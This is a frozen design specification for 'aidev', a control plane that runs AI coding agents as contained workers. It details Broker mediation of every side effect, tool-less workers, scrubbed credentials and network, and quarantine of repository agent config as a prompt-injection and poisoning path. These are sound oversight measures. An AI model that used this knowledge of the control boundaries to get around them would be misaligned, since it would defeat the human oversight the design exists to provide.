# aidev — Implementation Baseline v5.3 (FROZEN)

**Status:** **FROZEN v1 baseline — begin implementation. Start M0 today.** M0–M2 ready now. M3 gated
on S-05/S-06 and the written assessment contract. M4 gated on S-01–S-04, S-07, S-08. Remaining
uncertainty is resolved by S-01…S-08 and E-01…E-06 — **not by another architecture
version.** · **Date:** 2026-08-23
**Supersedes:** `deep-research-report.md`, `aidev-implementation-plan` v1.0, `aidev-plan-v2`,
`aidev-plan-v3-baseline`, `aidev-plan-v4`, `aidev-plan-v5`, `aidev-plan-v5.1`
**Incorporates:** `aidev at R0/R1: The Achievable Frontier` (performance research) and the v2, v3,
and v4 design reviews (correctness, mediation, trust root, recovery, read authority, repair
reassessment, environment identity, evaluation, and internal-consistency findings)

---

## 0. What changed, and why

### 0.1 From v5.1 → v5.3 (implementation-readiness patch)

The v5.1 review returned **GO to implementation** with one blocking spec correction and two
simplifications. This patch makes them. The architecture is untouched.

| v5.1 defect | Priority | v5.3 fix |
|---|---|---|
| **The P-39 rollback cut-point was wrong.** Voiding "workspace-local attempts at or below the checkpoint's `workspace_generation`" destroys too much: a generation is an *epoch*, not a position within it, so a write already represented by the checkpoint was voided alongside one that wasn't | **P0 blocker** | Add monotonic `action_attempt.attempt_seq` and `checkpoint.action_attempt_watermark`. The cut is `generation == old_gen AND attempt_seq > watermark` (P-39, I-25) |
| Rollback had no single implementation — recovery reset the tree with generation handling, while POSTDIFF promotion said only "restore the pre-IMPLEMENT checkpoint" | **P0 blocker** | One primitive, `rollback_to_checkpoint()`, used by both. An M2 audit proves no other code path resets the worktree |
| `I-10` says repo agent config **never** executes, while §8.5 allowed hash-approved opt-back-in and config exposed `agent_config_files` | **P0** | The opt-in is **deleted** for v1 (P-41). An absolute invariant with an approval escape hatch is not an invariant. Deferred in Appendix B with a revival trigger tied to S-07 |
| §7.3 still said "accuracy ≥85% / must exceed 95%", contradicting M3's directional gates | **P1** | Replaced with a normative pointer to P-40/E-03/M3; accuracy is diagnostic only |
| The dependency graph still annotated "S-07 **or** OS sandbox" for heavy tool access | **P1** | Corrected to match M7: S-07 required, sandbox additional |
| `policy.yaml` still used `Bash(kubectl *)` — the tool-name-glob model deleted by P-24 | **P1** | Typed Broker vocabulary (`verb: proc.exec, program: kubectl`); exact schema settles in M2 |
| Testing table row said "classifier accuracy"; M3 duplicated its provisioning deliverable; `phase_timing` omitted `postdiff`; §13 pointed at §8.4 and predated logical quarantine | **P2** | All corrected |

### 0.2 From v5.0 → v5.1 (freeze patch)

A surgical correctness patch, not a design cycle. The architecture is unchanged; six defects and a
set of residues are closed, and the document is then **frozen**.

| v5.0 defect | Priority | v5.1 fix |
|---|---|---|
| M7 allowed heavy tool access if S-07 proved interception **or** an OS sandbox existed — directly contradicting §8.3's "no sandbox-is-the-boundary fallback" and D-19 | **P0** | `BROKERED_TOOLS` requires S-07, full stop. A sandbox is defence in depth and may be made *additionally* mandatory, but never grants a mode (P-37, I-23) |
| `assessment` carried `UNIQUE(run_id, phase)`, so the mandatory `REPAIR → POSTDIFF` produced a second post-diff row that could not be inserted | **P0** | Append-only, ordinal-keyed, superseding chain; no assessment is ever overwritten (P-38, I-24) |
| A `SUCCEEDED` workspace-local effect survived a checkpoint rollback that erased it — journal and tree disagreed | **P0** | `workspace_generation` + `action_attempt` + `effect_scope`; local effects are generation-scoped and voided on rollback, external effects are not (P-39, I-25) |
| `F-PUBLIC-API` said `elevated`/R1-eligible while both classifiers called a public interface change R2 | **P1** | Split into `F-PUBLIC-API-TOUCH` (elevated, R1-eligible) and `F-PUBLIC-CONTRACT-CHANGE` (high, `force_heavy`) |
| M3 gated classifiers on overall accuracy — 95% whose five errors are all R2→R1 would pass | **P1** | Directional gates: R2+ and R3 recall, bounded underclassification with a one-sided limit; preflight and post-diff gated differently (P-40) |
| The **binding** Definition of Done still used single-ratio cache wording and "risk classification uses zero model calls", contradicting P-06/P-17/P-21 | **P1** | DoD rewritten to match; it outranks prose and must not drift |
| §8.1 still hardcoded a 5-minute TTL, a 1-hour TTL, and a 2× write premium | **P1** | Replaced with `adapter.measured_*` variables populated by S-04. No numeric provider-cache assumption is normative anywhere |
| Sandbox table showed implementers as `Secrets: deny` while §14.6 requires the adapter parent to hold provider auth | **P1** | Column split into **provider auth** and **project/user secrets**, with the adapter parent given its own row |
| CLI table had duplicate `trust`/`journal`/`env` rows, one saying "by lockfile hash" | **P2** | Deduplicated; residual lockfile-only wording removed from Appendix A |
| "memory promotion self-approves" read as a bypass of §15 | **P2** | Reworded: an explicitly human-approved promotion records its resulting hash automatically — the human approved that exact content |

### 0.3 From v4.0 → v5.0 (consistency freeze)

v4.0's new decisions were correct. The defect v5.0 fixes is different in kind: **ten sections still
described the v2/v3 world.** A plan whose §8 says the fast path is tool-less while its §14 sandbox
table gives the implementer "edit + scoped exec" is not a baseline — it is two plans in one file.
This pass propagates every v4 decision into every section that depends on it, and closes the gaps
that propagation exposed.

| v4.0 residue | Kind | v5.0 fix |
|---|---|---|
| §14.8 sandbox role table grants IMPLEMENTER "edit + scoped exec" and REVIEWER "read/search", contradicting tool-less `PATCH_ONLY` (P-29/I-18) | **Contradiction** | Role table rewritten around execution modes; profiles now describe *aidev's* process privileges, not model tool grants |
| Module layout has no `journal/`, `trust/`, `env/`, or patch-apply module — the plan mandates components the source tree does not contain | **Gap** | §6.2 rebuilt; `classify.py` split into `preflight.py` / `postdiff.py` |
| Failure taxonomy predates P-28/P-34/P-22/P-31 — no `patch_base_mismatch`, `postdiff_promoted`, `trust_unapproved`, `env_key_mismatch`, `action_unknown_external` | **Gap** | Six classes added with actions and limits |
| Testing strategy names no test for I-18…I-22, though each invariant claims a "named enforcing test" | **Gap** | Invariant-test matrix added (§19.1) |
| Config still exposes a single `target_hit_ratio`, no `[trust]`, no `[env]`, and presumes a universal 1-hour TTL | **Stale** | Config rebuilt around the three cache concepts, trust root, and env store |
| §10.2 VERIFY begins "apply patch" although application now happens at IMPLEMENT→POSTDIFF under the hash contract | **Stale** | Reordered; VERIFY starts at parse/compile |
| §5 hardcodes "5 minutes" and "1-hour TTL" as universal, contradicting P-21/S-04 (TTL is provider-measured) | **Stale** | Rewritten as measured policy |
| §11.2 frames the 400-LOC ceiling as "split before review", though it is enforced at POSTDIFF as an escalation trigger | **Stale** | Reframed |
| §15A promises "never evict an environment with an active lease" but no lease exists in the schema | **Gap** | `env_lease` table + lifecycle |
| I-12 states no model call is made where a deterministic answer exists, while the ambiguous-band tie-break is a knowing exception | **Unscoped invariant** | I-12 scoped, with the exception time-boxed to E-03 |
| `missed-dependency rate` (§9.4) and `context_gap` (§7.3) name the same quantity | **Drift** | Unified on `context_gap` |

### 0.4 From v3.0 → v4.0 (baseline freeze review)

The v3.0 architecture was sound, but the freeze review found boundary contracts that were still
underspecified or internally inconsistent. All ten findings were real defects.

| v3.0 issue | Severity | v4.0 resolution |
|---|---|---|
| `PATCH_ONLY` still allowed read tools, leaving unnecessary filesystem-read authority on the fast path | **Security** | Fast-path workers are **tool-less** and run from an aidev-owned neutral cwd; any model-visible read tool is heavy-path-only, Broker-mediated, and root-scoped (P-20, P-29, I-18) |
| `REPAIR` could reach `VERIFY` — and success — without re-running post-diff assessment | **Correctness** | Every repair returns to `POSTDIFF`; aggregate diff risk, TIA, closure, context gap, and size are recomputed (P-28, I-19) |
| M3 performs networked provisioning before the trust root, journal, and egress boundary exist in M4 | **Sequencing / security** | Trust root, action journal, and egress split move into M2; M3 provisioning must use them (P-30) |
| Environment identity was the lockfile hash alone | **Correctness** | `EnvKey` includes lockfiles, OS, arch, runtime/package-manager/toolchain versions, features, and env-relevant config; atomic publish after validation (P-31, I-21) |
| P-03 mandated one breakpoint while P-21 correctly made caching provider-specific | **Spec conflict** | P-03 mandates a byte-stable invariant *block*, not a breakpoint topology |
| M5.5 paired ~40 tasks with a −2pp non-inferiority claim it cannot resolve | **Evaluation** | Early gross-regression guard, separate from a sample-adaptive final gate (P-32) |
| `in_final_diff` called localization ground truth, though the patch is conditioned on the localizer | **Measurement** | Renamed `used_in_patch`, demoted to utilization telemetry; gold labels come from independent sources (P-33) |
| Patch application unspecified for stale base or fuzzy apply | **Correctness** | Expected base/result hashes; never fuzzy-apply on the fast path (P-34, I-20) |
| Idempotency key derived from `stage_attempt`, so a retry acquired a new identity | **Recovery** | Durable logical `action_id` allocated once at `PLANNED` (P-35, I-22) |
| Physical quarantine created artificial deletions in the worktree diff; pre-warm could precede quarantine | **Correctness / security** | Logical quarantine or sanitized view; pre-warm only in a neutral cwd (P-36) |

### 0.5 From v2.0 → v3.0 (design review)

The v2.0 review found four promises the specification did not actually keep, plus a set of real
inconsistencies. v3.0 makes them literally true.

| v2.0 defect | Severity | Fix |
|---|---|---|
| Classifier and TIA consume post-diff facts (files touched, AST delta, diff size) while running **before** the patch exists | **Logical hole** | Split into `PreflightAssessment` and `PostDiffAssessment`; post-diff is authoritative and re-runs risk, TIA, and closure (P-19) |
| "Every side effect crosses the Broker" contradicts Codex running its own tools in its own sandbox with approvals disabled | **Security** | Two worker execution modes: `PATCH_ONLY` and `BROKERED_TOOLS`; a provider that cannot prove interception stays `PATCH_ONLY` (P-20) |
| Repo-owned `.aidev/memory/*.md` and `.aidev/project.toml` are trusted implicitly — memory and command-execution poisoning path | **Security** | Local trust root with approved hashes; repo aidev config is a *proposal* until approved (P-22) |
| "No duplicated side effects" is unprovable: decision persisted, effect runs, crash, outcome unknown | **Correctness** | Action journal with idempotency keys and per-verb reconciliation; UNKNOWN non-idempotent external effects halt for a human (P-23) |
| Broker parses compound shell, wrappers, runners, redirects, `find -exec`, backgrounding | **Attack surface** | Model-originated execution is argv + `shell=False`, period. Shell only via locally approved static commands or a human gate (P-24) |
| Worker network/secrets denied, yet the adapter must reach the provider with subscription auth | **Unspecified** | Split control-plane egress from tool egress; parent owns credentials, tools get a scrubbed env and no network (P-25) |
| Worktree isolation mistaken for environment isolation — no venv, `node_modules`, or caches, and network is denied, so a fresh worktree cannot type-check or test | **Blocks M5** | v3 introduced provisioning; v4 replaced its lockfile-only key with the platform-complete `EnvKey` (P-26, P-31) |
| Paired eval gate only from M8, while M4–M7 set routing, prompting, and review behaviour | **Process** | Eval-lite at M5.5; explicit non-inferiority margin; escalated fast-path runs counted in end-to-end numbers (P-27) |

Smaller corrections: the fast path is a **minimal linear FSM**, not "not an FSM"; TIA fail-safe
semantics unified on *full suite*; risk floors split into `risk_floor` and `force_heavy` so an
`elevated` floor no longer ejects an R1 task from the fast path; the M4 cache exit criterion now
uses a forced-repair fixture (a one-call run cannot demonstrate a second-call cache hit); and the
spike dependency graph now matches the spike table.

### 0.6 From v1.0 → v2.0 (performance research)

The performance research falsified six commitments in v1.0. They were architecturally elegant and
economically wrong. This version reverses them.

| v1.0 decision | Verdict | Replacement |
|---|---|---|
| Fresh context per stage | **Reversed** — cache-hostile; forces a full prefix re-pay every stage | One byte-stable cached prefix per task; fork for review |
| One worker process per stage | **Reversed** — 14k–33k fixed prefix × stage count is pure ceremony | Warm session; ≤3 model calls at R0/R1 |
| Mandatory independent review at R1 | **Reversed** — LLM diff review F1 <20%, false positives induce regressions | Review is conditional and gated behind a deterministic finding |
| Model-based risk classification | **Reversed** — it is a static-analysis problem | Deterministic scorer; model only for the ambiguous mid-band |
| Full relevant unit suite at R1 | **Reversed** — same coverage at 2–8× less wall clock | Impacted-test selection with fail-safe |
| Adaptive token budget with "evidence coverage" stop rule | **Replaced** — placeholder with no computable definition | Symbol-closure predicate + 6–10 file ceiling |
| Uniform FSM for all risk classes | **Split** — decomposition buys ~nothing below R2 | Two-track: Agentless fast path (R0/R1), full FSM (R2/R3) |

**Unchanged and still correct:** deterministic control-plane ownership, git worktree isolation,
the Action Broker, trust/provenance labelling, untrusted-repository hardening, SQLite + events +
checkpoints, evidence-gated completion, human gates, evaluation before optimisation. The security
architecture survives intact; the *performance* architecture is rebuilt.

**The honest headline:** the original 2× speed / 0.5× tokens / better quality target is not
simultaneously reachable. The achievable frontier is **1.2–1.6× faster, 0.7–0.9× tokens, at
equal-or-better quality** — and only with the changes above. v1.0 as written would have been
*slower and token-neutral at best*.

---

## 1. How to use this document

| Convention | Meaning |
|---|---|
| **D-nn** | Locked decision. Changing it requires an ADR supersede. |
| **I-nn** | Invariant. Must hold always; each has a named enforcing test. |
| **M-n** | Milestone. Sequential, binary exit criteria. |
| **S-nn** | Spike — must finish before the milestone that needs it. |
| **E-nn** | Open experiment — measures something currently unmeasured. |

Five governing rules:

1. **Measure before optimising.** Token and latency accounting ship in M0, not M8. Every claim in
   §4.4 is a hypothesis until E-01 runs.
2. **Deterministic before model.** If a compiler, an import graph, or a git log can answer it, no
   model call is made. Every eliminated call is pure speed and pure tokens.
3. **Vertical slice before depth.** M0 runs a complete task with fake workers before real
   intelligence is added.
4. **This document is frozen.** Open questions are answered by S-01…S-08 and E-01…E-06, which write
   their findings back as ADR supersedes. A new architecture version is not the tool for resolving a
   spike.
5. **The boundary precedes the effect.** The Action Broker, trust root, action journal, and egress
   split all exist before the first networked provisioning, the first approved project command, and
   the first real model call.

---

## 2. Product definition

`aidev` is a **local, single-user, deterministic development control plane**. It owns workflow
state, context assembly, policy, isolation, verification, and evidence. Claude Code and Codex are
replaceable cognitive workers behind adapters, not the system's brain.

### 2.1 Performance targets (revised, honest)

| Axis | R0 | R1 | R2/R3 |
|---|---|---|---|
| Wall clock vs solo agent | 1.5–2.0× faster | 1.2–1.6× faster | 0.5–0.8× (slower, by design) |
| Tokens vs solo agent | 0.5–0.7× | 0.7–0.9× | 1.5–3× (more, by design) |
| Quality | Equal or better | Better | Substantially better |

The R2/R3 numbers are *supposed* to be worse on speed and tokens. That is what the extra assurance
costs, and it is spent only where a mistake is expensive.

**Binding constraint:** the per-invocation cold-start tax (fixed prefix reprocessing + process
startup) multiplied by call count. Every performance decision below exists to shrink that product.

### 2.2 v1.0 Definition of Done

- [ ] `aidev run "<task>"` takes an R0/R1 task to `READY` unattended.
- [ ] Fast path uses **≤3 model calls**; the invariant block stays byte-stable for its version
      across every call in a task (I-11).
- [ ] `process_warm`, `project_prefix_cached`, and `task_context_cached` are reported **separately**;
      the forced-repair fixture achieves `task_context_cached > 0.8` on call 2+. A one-call task
      reports process warmth and project-prefix behaviour only and is **not** a cache failure (P-17,
      P-21).
- [ ] Localization, impacted-test selection, closure, and **post-diff** classification use **zero
      model calls**. Preflight classification is deterministic except the temporary,
      escalation-only ambiguous-band tie-break permitted by P-06 until E-03 retires it (I-12).
- [ ] The fast-path implementer is **tool-less** — no read, write, exec, network, MCP, or secret tool
      is model-visible — and runs from an aidev-owned neutral cwd (P-29, I-18).
- [ ] A structured patch never fuzzy-applies: expected base and result identity are verified on every
      operation; mismatch re-localizes or escalates (P-34, I-20).
- [ ] Every repair re-enters `POSTDIFF`, and the **aggregate** diff against the original base is
      reassessed before verification (P-28, I-19). Assessments are append-only (P-38, I-24).
- [ ] `BROKERED_TOOLS` is granted only where S-07 proved interception; sandbox availability never
      grants it (P-37, I-23).
- [ ] Every run executes in a private worktree; the user's checkout is never modified.
- [ ] Killing the daemon mid-run and restarting resumes from checkpoint. Content-addressable and
      idempotent effects reconcile automatically; ambiguous **external** effects halt for human
      reconciliation rather than replay; **workspace-local effects from a rolled-back generation are
      voided and re-derived even when recorded `SUCCEEDED`** (P-39, I-25).
- [ ] Every worker side effect crossed the Action Broker and is in the event log with a decision —
      structurally guaranteed on the fast path, where the worker holds no mutation tools (P-20).
- [ ] Repo-supplied `.aidev` config executes only after local hash approval (P-22).
- [ ] Crash injection at every action state reconciles or halts; no non-idempotent external effect
      is ever silently replayed (P-23).
- [ ] A worker-invoked command cannot read provider credentials or reach an unapproved host (I-17).
- [ ] Verification runs with network denied on a provisioned environment (P-26).
- [ ] `READY` requires recorded deterministic verification evidence.
- [ ] Repo-supplied hooks and MCP config never execute (canary test).
- [ ] Human gates fire for every action on the frozen list, showing action, consequence, exact
      command, rollback, evidence.
- [ ] Token and latency accounting itemised per call and per phase, from M0 onward.
- [ ] Eval harness runs ≥30 tasks with paired workflow comparison.
- [ ] Measured performance meets §2.1 on the eval corpus, or the gap is documented with cause.
- [ ] `uv tool install aidev` works on macOS and Linux.

### 2.3 Non-goals for v1

Team/multi-user, cloud control plane, remote agents, autonomous production deployment, learned
routing, vector memory, plugin marketplace, Windows, IDE extensions, agent swarms.

### 2.4 Invariants

| ID | Invariant | Enforced by |
|---|---|---|
| I-01 | `aidev`, never a model, decides state transitions | FSM guard tests; no LLM call in the transition path |
| I-02 | The daemon is the only DB writer | CLI read-only; write path is IPC only |
| I-03 | No worker writes outside its run worktree + scratch | Broker path canonicalisation; sandbox policy |
| I-04 | Workers inherit an env allowlist, never `os.environ` | `spawn()` test asserts the exact env set |
| I-05 | A deterministic risk floor can be raised, never lowered | Floors applied after any model input |
| I-06 | `READY` requires a stored passing `VerificationReport` | FSM guard on the terminal transition |
| I-07 | Untrusted content is never in an instruction position | Prompt assembler raises on violation |
| I-08 | Stage boundaries commit in one SQL transaction | Crash test at every boundary |
| I-09 | Frozen human gates cannot be satisfied by config or model | Gate list is a constant, not policy data |
| I-10 | **Repository-supplied agent config never executes, and no approval path exists to make it execute** | Hardening flags + logical quarantine; canary test; config-schema test asserts no opt-in key is accepted |
| I-11 | **The invariant cache block is byte-stable for its version within a task** | Invariant-block hash asserted equal across calls; provider task-context caching may extend after it |
| I-12 | **No model call is made where a deterministic answer exists**, with exactly one time-boxed exception: the preflight ambiguous-band tie-break, which may only escalate and is retired by E-03 | Call-site audit test enumerating permitted model call sites; localizer, closure, post-diff classifier, and TIA have zero model dependency |
| I-13 | **Model-originated execution is argv only; `shell=False` always** | Spawn-site test; no code path passes a model-produced string to a shell |
| I-14 | **Repo-supplied aidev config is data until locally hash-approved** | Trust-root test: a mutated `.aidev/project.toml` never executes and never reaches an instruction position |
| I-15 | **Every non-idempotent external effect has an idempotency key and a terminal journal state** | Journal completeness test; crash-injection at each action state |
| I-16 | **An assessment may only consume facts that exist at its own time** | Preflight scorer has no access to diff-derived fields; enforced by type, not convention |
| I-17 | **Model-invoked tools cannot read provider credentials or reach unapproved network** | S-08 canary; runs in CI against both providers |
| I-18 | **Fast-path workers have zero model-visible tools; any model-visible read outside the context packet is heavy-path-only, Broker-mediated, and root-scoped** | Tool-surface contract test + repo/home read-escape canary |
| I-19 | **Every repair returns through POSTDIFF before verification** | FSM property test over all repair paths |
| I-20 | **Fast-path patches never fuzzy-apply; expected base and result identity are verified** | Patch-contract test with stale-base injection |
| I-21 | **Environment reuse requires an exact platform-complete `EnvKey` match** | EnvKey fixture matrix across OS/arch/runtime/toolchain |
| I-22 | **An action keeps the same logical `action_id` across retry and recovery** | Journal crash/retry identity test |
| I-23 | **Tool access requires proven interception. Sandbox availability never grants a mode** | Registry test: a provider failing S-07 cannot be set to `BROKERED_TOOLS` under any sandbox configuration |
| I-24 | **No assessment is ever overwritten** | Repair fixture asserts `postdiff#1` and `postdiff#2` both persist with the promotion delta |
| I-25 | **All rollbacks go through one primitive, and it voids exactly the workspace-local attempts above the checkpoint's `action_attempt_watermark` in the abandoned generation — no more, no fewer** | Two-write fixture (one below the watermark, one above) across both crash recovery and POSTDIFF promotion; journal and tree agree, and the below-watermark effect is not re-derived |

---

## 3. Locked decisions

Superseded v1.0 decisions are struck and renumbered; new decisions carry the `P-` prefix for
performance.

### 3.1 Core (unchanged)

| ID | Decision |
|---|---|
| D-01 | Custom typed FSM + SQLite as the workflow runtime |
| D-03 | Mutable current state + append-only events + stage snapshots; not event sourcing |
| D-04 | SQLite WAL + FTS5, one logical writer |
| D-05 | Git worktrees are the isolation unit; one per run, private branch |
| D-06 | Never mutate a dirty working tree; build from committed `HEAD` and say so |
| D-07 | Workers are CLI/SDK-backed by default; API adapters optional |
| D-08 | Capability-based routing; never model names in workflows |
| D-09 | Model registry is versioned config, not code |
| D-10 | One `ArtifactEnvelope` + 9 payload families |
| D-11 | Contracts in Pydantic, exported to JSON Schema |
| D-12 | Risk is a 10-dimension vector with a derived R0–R3 class from safety floors |
| D-13 | Risk recomputed after localization, after design (heavy path), after diff |
| D-14 | Context carries `trust` and `provenance`; only 4 trust levels may instruct |
| D-16 | Serena is a `ContextProvider`, not a hard dependency |
| D-18 | Canonical memory is Markdown in-repo; history search is FTS5; no vector DB |
| D-19 | All worker side effects cross a single Action Broker |
| D-20 | v1 sandbox = provider-native isolation + broker policy. **OS isolation is defence in depth and never grants tool access**; it may be made *additionally* mandatory for R2/R3, but it cannot substitute for proven interception (P-37). Remaining backends in M9 |
| D-21 | Env is an allowlist; secrets and network denied by default |
| D-22 | Policy is typed Python invariants + YAML overrides; no OPA/Cedar |
| D-23 | Project policy may only tighten; weakening a floor is a local human act |
| D-24 | Verification is a plugin system with a risk-adaptive matrix |
| D-26 | Generated tests are executed and reviewed, never trusted |
| D-28 | Findings have a lifecycle and are adjudicated before any fix |
| D-30 | Quota pressure is ordinal and may only alter optional work |
| D-31 | Internal event schema is stable and OTel-mappable |
| D-32 | Prompt/output content logging off by default; metadata always on |
| D-33 | Cost is labelled "API-equivalent estimate", never subscription spend |
| D-34 | Offline eval harness is a v1 requirement |
| D-35 | Every stage is replay-safe or explicitly reconcilable, and resumable from checkpoint; ambiguous non-idempotent external effects halt rather than replay |
| D-36 | Daemon on a Unix socket, `0600`, no TCP |
| D-37 | macOS + Linux only in v1 |
| D-39 | Python 3.12+, `uv` packaging |
| D-40 | Verification adapters: Python, Node/TS, generic-from-config |

### 3.2 Performance decisions (new — these are the v2.0 core)

| ID | Decision | Evidence |
|---|---|---|
| **P-01** | **Two-track execution.** R0/R1 use an Agentless-style fast path; R2/R3 use the full FSM. | Cheapest agent ≈92% of most-expensive pass@1 on simplest tasks; separation only appears at high complexity |
| **P-02** | **Warm worker sessions.** One session per task, forked for review. No process-per-stage. | 14k–33k fixed prefix + multi-second startup, re-paid per process |
| **P-03** | **Byte-stable invariant block.** Tool schema, aidev policy, and approved project invariants are version-stable. Adapters choose breakpoint topology or automatic extension, provided block identity and cache accounting stay observable. | Exact-prefix caching rewards stability, but provider cache topology differs |
| **P-04** | **Fast path budget: ≤3 model calls.** Localize/classify (usually model-free), implement, conditional repair. | Decomposition buys ~nothing below R2 |
| **P-05** | **Constrained-schema single call for IMPLEMENT** at R0/R1, not an agentic tool loop. | Native structured output ≈100% schema fidelity; replaces ~12-turn median agent run |
| **P-06** | **Model-free localization and default classification** from import graph, symbol closure, git co-change, and path rules. A temporary escalation-only tie-break is permitted in the preflight ambiguous band until E-03 retires it. | Static signals competitive at ~zero token cost |
| **P-07** | **Context ceiling: 6–10 files, symbol closure, no line-level over-slicing.** | Beyond the knee, extra context degrades correctness, not just cost |
| **P-08** | **Sufficiency is a computable predicate**, not a model judgement: zero unresolved symbols at the edit site AND impacted-test imports ⊆ context. | Replaces the v1.0 placeholder |
| **P-09** | **Impacted-test selection with fail-safe**, not full-suite, at R0/R1. | 2–8× wall-clock reduction; fail safe on stale maps or manifest changes |
| **P-10** | **Warm type-checker daemon** per worktree; never a cold checker per verification. | ~30s cold → ~3s incremental |
| **P-11** | **Fail-fast check ordering:** parse → type → impacted tests (`-x`) → lint/SAST in parallel. | Cheapest, most discriminative first |
| **P-12** | **Effort tiering:** R0 minimal, R1 low; escalate only on deterministic verification failure. | Quality plateaus at medium; high can degrade |
| **P-13** | **Model/effort cascade escalation after an implementation attempt keys on deterministic verification evidence, never model self-confidence.** Risk promotion, `force_heavy` floors, closure failure, context gap, diff size, and localization uncertainty remain separate deterministic path-escalation triggers. | Self-reported confidence is poorly calibrated; the test oracle is free and exact |
| **P-14** | **Review is conditional at R1**, and the model triages deterministic findings rather than opining freely on small diffs. | LLM diff review F1 <20%; false positives induce regressions |
| **P-15** | **Diff-size ceiling ~400 LOC** at R0/R1; beyond it, split the task. | Review reliability drops sharply above 200–400 LOC |
| **P-16** | **No MCP servers on the fast path.** Tool list is locked at session start. | Each server adds 10–20k tokens/session and invalidates the cached prefix |
| **P-17** | **Cache health is first-class and concept-specific.** Measure `process_warm`, `project_prefix_cached`, and `task_context_cached` separately; the >0.8 target applies to task-context cache reads on call 2+ where such a call exists. | Provider TTL defaults have changed silently before, eroding the token math |
| **P-18** | **Token and latency accounting ship in M0.** No optimisation decision is made without them. | The optimisation is blind until the baseline is decomposed |
| **P-19** | **Two-phase assessment.** `PreflightAssessment` uses only pre-diff facts; `PostDiffAssessment` is authoritative and recomputes risk, TIA, and closure from the actual patch. | The v2 classifier consumed facts that did not exist yet |
| **P-20** | **Two worker execution modes.** `PATCH_ONLY` is tool-less and returns a structured patch for aidev to apply. `BROKERED_TOOLS` exposes only root-scoped tools whose every request — reads included — is interceptable before execution. Unproven interception ⇒ `PATCH_ONLY`. | Otherwise the Broker is prose, not a boundary |
| **P-21** | **Three cache concepts modelled separately:** `process_warm`, `project_prefix_cached`, `task_context_cached`. Each adapter picks its own strategy; each has its own metric. | v2 conflated them into one over-specified breakpoint |
| **P-22** | **Local trust root.** Repo `.aidev/memory/*.md` and `.aidev/project.toml` are proposals; approved content hashes live in daemon-owned SQLite (`trusted_content`), never in the repository. | Repo-owned config is an execution and instruction-injection path |
| **P-23** | **Action journal.** `PLANNED → AUTHORIZED → STARTED → SUCCEEDED \| FAILED \| UNKNOWN`, idempotency key and reconciliation strategy per verb. | Decision-before-effect does not survive a crash mid-effect |
| **P-24** | **argv + `shell=False` for all model-originated execution.** Shell expressions only as locally approved static project commands or behind a human gate. | Removes a shell-parser attack surface rather than defending it |
| **P-25** | **Control-plane egress ≠ tool egress.** The adapter parent owns provider credentials and network; model-spawned tools get a scrubbed env and no network. | The worker must reach the model; the model's tools must not |
| **P-26** | **Provisioned environments.** Dependency state is prepared before verification, shared where safe, with writable caches isolated per worktree. Identity is defined by P-31, not lockfiles alone. | A worktree with network denied cannot otherwise type-check or test |
| **P-27** | **Eval-lite from M5.5.** Escalated and failed fast-path attempts count at full end-to-end cost; early eval is a guardrail, not an overclaimed final proof. | Excluding expensive failures makes the fast path look artificially good |
| **P-28** | **Repair always re-enters POSTDIFF.** The aggregate diff against the original base is reassessed for risk, TIA, closure, context gap, and size before any re-verification. | A repair can widen scope or introduce risk exactly as an initial patch can |
| **P-29** | **Fast-path workers are tool-less.** `PATCH_ONLY` presents an empty model-visible tool surface and runs from a neutral cwd. Exploratory reads are heavy-path-only and Broker/root constrained. | Read authority exposes unrelated local files even when writes and network are denied |
| **P-30** | **Security substrate precedes provisioning.** Trust root, action journal, and egress split ship in M2, before M3 may perform networked provisioning or execute an approved project command. | External effects need their boundary before the first external effect |
| **P-31** | **Platform-complete environment identity.** `EnvKey = H(lockfiles, OS, arch, runtimes, package managers, toolchains, features, env-relevant config)`; publish only after validation, by atomic rename. | Identical lockfiles can require incompatible native environments |
| **P-32** | **Sample-aware evaluation gates.** M5.5 blocks gross regressions on a small corpus; the −2pp non-inferiority gate is sample-adaptive and binds only once the interval is decisive. | ~40 tasks cannot resolve a 2pp margin |
| **P-33** | **Independent localization ground truth.** `used_in_patch` is utilization telemetry; precision and recall are measured against historical accepted edits, human labels, or hidden dependency evidence. | Final patch membership is circular — the patch is conditioned on the localizer |
| **P-34** | **Hash-guarded patch application; no fuzzy apply on the fast path.** Every operation carries expected base identity and intended result hash; mismatch re-localizes or escalates. | Silent fuzzy application mutates the wrong code after context drift |
| **P-36** | **Logical quarantine and neutral pre-warm.** Repo agent config is masked or excluded without polluting the worktree diff; provider processes pre-warm only in an aidev-owned neutral cwd. | Physical removal creates artificial deletions; project pre-warm executes config too early |
| **P-35** | **Durable logical action identity.** `action_id` is allocated once at `PLANNED` and reused across retry and recovery; an intentionally repeated action gets a new id. | `stage_attempt` must not change idempotency identity |
| **P-37** | **An OS sandbox is defence in depth and never a grant of authority.** `BROKERED_TOOLS` requires proven interception (S-07); sandbox availability cannot substitute for it, at M7 or ever. | Interception provides policy and audit; a sandbox provides containment. They are not interchangeable |
| **P-38** | **Assessments are append-only and ordinal-keyed.** A repaired run keeps every preflight and post-diff assessment in a superseding chain. | `UNIQUE(run_id, phase)` destroyed the answer to "why was the repair riskier than the patch?" |
| **P-39** | **Generation + watermark scope local effects.** Each action declares `effect_scope`; each attempt carries a monotonic `attempt_seq`; each checkpoint records the `action_attempt_watermark` it represents. One primitive `rollback_to_checkpoint()` — used by crash recovery **and** POSTDIFF promotion — increments the generation and voids workspace-local attempts *above the watermark*, even at `SUCCEEDED`. External effects are generation-independent. | A journal that says a write happened over a tree where it did not is a bad failure; voiding a write the checkpoint already contains is a different one. Generation alone cannot tell them apart |
| **P-40** | **Classifier gates measure directional error, not accuracy.** Post-diff gates on R2+/R3 recall and a bounded underclassification rate; preflight is gated more loosely because post-diff catches it. | 95% accuracy whose errors are all R2→R1 is a safety failure wearing a passing grade |
| **P-41** | **No opt-back-in for repo-native agent config in v1.** Repo `.claude/`, `.mcp.json`, `.codex/`, `AGENTS.md`, `CLAUDE.md` may be inventoried and read as data; they never execute and never register tools, by any approval path. | An absolute invariant with an escape hatch is not an invariant, and aidev needs no other agent's config |

### 3.3 Superseded

| Old | Now |
|---|---|
| ~~D-02 FSM everywhere~~ | P-01 two-track |
| ~~D-15 adaptive budget + evidence coverage~~ | P-07 + P-08 |
| ~~D-17 Repomix optional provider~~ | Deferred entirely; the fast path has no use for structural compression |
| ~~D-25 mandatory independent test plan at R1~~ | Independent test plan at R2/R3 only; R1 relies on existing impacted tests |
| ~~D-27 mandatory review at R1~~ | P-14 conditional review |
| ~~D-29 cross-provider review preference~~ | Retained for R2/R3 only |
| ~~D-38 one active run per project~~ | Retained, but the fast path is short enough that queuing rarely bites |

---

## 4. The fast path (R0/R1) — the primary product

